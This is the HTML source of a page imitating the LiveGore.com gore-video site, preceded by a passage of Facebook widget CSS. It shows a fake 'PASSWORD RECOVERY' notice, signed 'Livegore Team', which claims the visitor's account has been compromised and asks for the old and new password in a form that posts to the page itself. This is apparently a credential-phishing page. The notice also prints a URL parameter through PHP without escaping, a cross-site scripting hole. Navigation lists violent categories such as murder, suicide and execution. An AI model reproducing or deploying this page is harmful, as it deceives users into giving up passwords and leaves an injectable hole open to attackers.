fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style></head>
		<body class="rb-template-login rb-body-js-on">
			<script>
				var b=document.getElementsByTagName('body')[0];
				b.className=b.className.replace('rb-body-js-off', 'rb-body-js-on');
			</script>
			<input type="checkbox" id="checkbox-menu4" class="hide">
				<rbmain>
					<div id="rb-body" class="grid">
						<input type="checkbox" id="checkbox-menu2" class="hide">
							<header class="rb-headerf">
								<div class="rb-search-container">
									<div class="rb-search">
										<form method="get" action="https://www.livegore.com/search">
											
											<input type="text" name="q" value="" class="rb-search-field" id="rb_livesearch" autocomplete="off">
											<input type="submit" value=" " class="rb-search-button">
										</form>
									</div>
									<div class="rb-waiting2"></div>
									<div id="rb_live_results"></div>
								</div>
								<headertop class="rb-header-top">
									<div class="rb-header">
										<label class="mobile-header-2 hide" for="checkbox-menu4"></label>
										<div class="second-head">
											<div class="rb-cat-main">
												<button type="button" class="rb-cat-button" data-toggle="dropdown" aria-expanded="false"></button>
												<div class="rb-cat">
													<span class="rb-nav-cat-item rb-nav-cat-all"><a class="rb-nav-cat-link" href="https://www.livegore.com/categories">All categories</a></span>
													<ul class="rb-nav-cat-list rb-nav-cat-list-4">
														<li class="rb-nav-cat-item rb-nav-cat-all">
															<a href="https://www.livegore.com/" class="rb-nav-cat-link rb-nav-cat-selected">All categories</a>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-accident">
															<a href="https://www.livegore.com/accident" class="rb-nav-cat-link">Accident</a>
															<span class="rb-nav-cat-note">(5,261)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-kill">
															<a href="https://www.livegore.com/kill" class="rb-nav-cat-link">Kill</a>
															<span class="rb-nav-cat-note">(449)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-shoot">
															<a href="https://www.livegore.com/shoot" class="rb-nav-cat-link">Shoot</a>
															<span class="rb-nav-cat-note">(2,227)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-slaughter">
															<a href="https://www.livegore.com/slaughter" class="rb-nav-cat-link">Slaughter</a>
															<span class="rb-nav-cat-note">(227)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-crime">
															<a href="https://www.livegore.com/crime" class="rb-nav-cat-link">Crime</a>
															<span class="rb-nav-cat-note">(2,341)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-murder">
															<a href="https://www.livegore.com/murder" class="rb-nav-cat-link">Murder</a>
															<span class="rb-nav-cat-note">(1,094)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-cartel">
															<a href="https://www.livegore.com/cartel" class="rb-nav-cat-link">Cartel</a>
															<span class="rb-nav-cat-note">(136)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-medical">
															<a href="https://www.livegore.com/medical" class="rb-nav-cat-link">Medical</a>
															<span class="rb-nav-cat-note">(788)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-suicide">
															<a href="https://www.livegore.com/suicide" class="rb-nav-cat-link">Suicide</a>
															<span class="rb-nav-cat-note">(1,067)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-animal">
															<a href="https://www.livegore.com/animal" class="rb-nav-cat-link">Animal</a>
															<span class="rb-nav-cat-note">(923)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-dead">
															<a href="https://www.livegore.com/dead" class="rb-nav-cat-link">Dead</a>
															<span class="rb-nav-cat-note">(1,156)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-execution">
															<a href="https://www.livegore.com/execution" class="rb-nav-cat-link">Execution</a>
															<span class="rb-nav-cat-note">(1,120)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-fighting">
															<a href="https://www.livegore.com/fighting" class="rb-nav-cat-link">Fighting</a>
															<span class="rb-nav-cat-note">(1,585)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-stabs">
															<a href="https://www.livegore.com/stabs" class="rb-nav-cat-link">Stabs</a>
															<span class="rb-nav-cat-note">(640)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-extreme">
															<a href="https://www.livegore.com/extreme" class="rb-nav-cat-link">Extreme</a>
															<span class="rb-nav-cat-note">(3,103)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-fun">
															<a href="https://www.livegore.com/fun" class="rb-nav-cat-link">Fun</a>
															<span class="rb-nav-cat-note">(2,191)</span>
														</li>
														<li class="rb-nav-cat-item rb-nav-cat-war">
															<a href="https://www.livegore.com/war" class="rb-nav-cat-link">War</a>
															<span class="rb-nav-cat-note">(1,771)</span>
														</li>
													</ul>
													<div class="rb-nav-cat-clear">
													</div>
												</div>
											</div>
										</div>
										<div class="rb-logo">
											<a href="https://www.livegore.com/" class="rb-logo-link" title="LiveGore.com"><img src="rb-theme/livegore/img/logo.png" alt="LiveGore.com" border="0"></a>
										</div>
										<div class="userpanel">
											<ul>
												<li>
													<a class="reglink reg" href="https://www.livegore.com/register">Register</a>
												</li>
												<li>
													<label class="reglink log" for="checkbox-menu2">Login</label>
												</li>
											</ul>
										</div>
										<div class="rb-search-opener" data-toggle="dropdown" data-target=".rb-headerf" aria-expanded="false"></div>
									</div>
								</headertop>
								<label class="modal-backdrop" for="checkbox-menu2"></label>
								<div class="modal-dialog">
				<div class="modal-header">
				<label type="button" class="close" for="checkbox-menu2">×</label>
				<h4 class="modal-title">Login</h4>
				</div>
									<div class="modal-body">
										<form action="https://www.livegore.com/login?to=login" method="post">													
							<input type="text" id="rb-userid" name="emailhandle" placeholder="Email or Username" required>							
							<input type="password" id="rb-password" name="password" placeholder="Password" required>
							<input type="hidden" name="code" value="0-1685304835-dffe8efd337639c14bfc4841ffef454b8372c42f">
							<input type="submit" value="Sign in" id="rb-login" name="dologin">
							<div id="rb-rememberbox"><input type="checkbox" name="remember" id="rb-rememberme" value="1">
							<label for="rb-rememberme" id="rb-remember">Remember</label></div>							
						</form>
									</div>
									<div class="modal-footer">
										<ul class="rb-nav-user-list">
											<li class="rb-nav-user-item rb-nav-user-login">
												<a href="https://www.livegore.com/login?to=login" class="rb-nav-user-link rb-nav-user-selected">Login</a>
											</li>
											<li class="rb-nav-user-item rb-nav-user-register">
												<a href="https://www.livegore.com/register?to=login" class="rb-nav-user-link">Register</a>
											</li>
										</ul>
										<div class="rb-nav-user-clear">
										</div>
									</div>
								</div>
								<div class="leftmenu">
									<label class="mobile-header-top" for="checkbox-menu4">
			<div class="mobile-header">
			<span class="menu-global menu-top"></span>
			<span class="menu-global menu-middle"></span>
			<span class="menu-global menu-bottom"></span>
			</div>
			</label>
									<div class="rb-nav-main">
										<ul class="rb-nav-main-list">
											<li class="rb-nav-main-item rb-nav-main-questions">
												<a href="https://www.livegore.com/" class="rb-nav-main-link">Home</a>
											</li>
											<li class="rb-nav-main-item rb-nav-main-hot">
												<a href="https://www.livegore.com/hot" class="rb-nav-main-link">Hot!</a>
											</li>
											<li class="rb-nav-main-item rb-nav-main-tag">
												<a href="https://www.livegore.com/tags" class="rb-nav-main-link">Tags</a>
											</li>
										</ul>
										<div class="rb-nav-main-clear">
										</div>
									</div>
								</div>
								<label class="modal-backdrop2" for="checkbox-menu4"></label>
								<div class="second-header">
								</div>
							</header>
							<style>
h1 {text-align: center; }
p {text-align: center; }
</style>
<h1><a href="https://www.reeleak.com/" target="_blank">www.reeleak.com</a></h1>
<p>Reeleak is an alternative to LiveGore, now you can surf and watch LiveGore content directly from Reeleak. </p>
							<div class="rb-nav-top">
								<div class="rb-nav-sub">
								</div>
							</div>
							<div id="rb-body-wrapper">
								<div class="ads">
									
								</div><center>
<h1>PASSWORD RECOVERY</h1>
<h3>Your account <?=$_GET['username']?> and its associated e-mail have been compromised. We advise that you change your password immediately.

</h3><h3><div>Livegore Team</div></h3><h3><font color="red">Important Update!</font></h3>
</center>
								<div class="rb-main">
									<div class="leftside">
										<div class="rb-part-form">
											<form method="post">
												<div class="rb-form-tall-note"></div><table class="rb-form-tall-table">
													<tbody>
													<!--<tr>
														<td class="rb-form-tall-label">
															Email or Username:
														</td>
													</tr>
													<tr>
														<td class="rb-form-tall-data">
															<input name="emailhandle" id="emailhandle" dir="auto" type="text" value="" class="rb-form-tall-text" required>
														</td>
													</tr>-->
													<tr>
														<td class="rb-form-tall-label">Old Password: </td>
													</tr>
													<tr>
														<td class="rb-form-tall-data">
															<input name="password" id="password" dir="auto" type="password" class="rb-form-tall-text" required>
															</td>
														
													</tr>
													<tr><td class="rb-form-tall-label">New Password:</td></tr><tr><td class="rb-form-tall-data">
															<input type="password" class="rb-form-tall-text" id="newpass" name="new-password" required>
														</td></tr><tr>
														<td class="rb-form-tall-label">
															<label>
																<input name="remember" type="checkbox" value="1" class="rb-form-tall-checkbox">
																Remember me on this computer
															</label>
														</td>
													</tr>
													<tr>
														<td colspan="1" class="rb-form-tall-buttons">
															<input title="" type="submit" class="rb-form-tall-button rb-form-tall-button-login" value="Confirm">
														</td>
													</tr>
												</tbody></table>
												<input type="hidden" name="dologin" value="1">
												<input type="hidden" name="code" value="0-1685304835-dffe8efd337639c14bfc4841ffef454b8372c42f">
											</form>
										</div>
									</div>
								</div> <!-- END rb-main -->
								
								<div class="solyan">
									<div class="rb-sidepanel">
										<ul class="rb-nav-cat-list rb-nav-cat-list-1">
											<li class="rb-nav-cat-item rb-nav-cat-all">
												<a href="https://www.livegore.com/" class="rb-nav-cat-link rb-nav-cat-selected">All categories</a>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-accident">
												<a href="https://www.livegore.com/accident" class="rb-nav-cat-link">Accident</a>
												<span class="rb-nav-cat-note">(5,261)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-kill">
												<a href="https://www.livegore.com/kill" class="rb-nav-cat-link">Kill</a>
												<span class="rb-nav-cat-note">(449)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-shoot">
												<a href="https://www.livegore.com/shoot" class="rb-nav-cat-link">Shoot</a>
												<span class="rb-nav-cat-note">(2,227)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-slaughter">
												<a href="https://www.livegore.com/slaughter" class="rb-nav-cat-link">Slaughter</a>
												<span class="rb-nav-cat-note">(227)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-crime">
												<a href="https://www.livegore.com/crime" class="rb-nav-cat-link">Crime</a>
